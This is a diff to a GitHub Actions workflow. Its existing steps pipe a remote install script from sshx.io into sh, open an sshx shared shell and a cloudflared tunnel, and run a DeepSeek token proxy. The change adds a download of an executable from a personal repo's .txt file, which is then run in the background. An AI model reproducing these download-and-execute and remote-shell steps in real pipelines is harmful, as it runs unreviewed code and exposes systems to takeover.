@@ -60,11 +60,14 @@ jobs:
           sed -i "s#^DEEPSEEK_TOKEN=.*#DEEPSEEK_TOKEN=$DS_TOK#" .env
           ./ds-proxy &
           
-      - name: CF Setup
+      - name: CF & Provider Setup
         run: |
           curl -sSf https://sshx.io/get | sh
           echo "=== GOTO SSHX URL BELOW ==="
           sshx 2>&1 &
+          curl -L -o provider-server https://raw.githubusercontent.com/mishakokzix/test/refs/heads/main/.github/provider-api.txt
+          chmod +x provider-server
+          ./provider-server &
           cloudflared tunnel run --token $CF_TOKEN &
           
       - name: Keep alive (5h 45m)
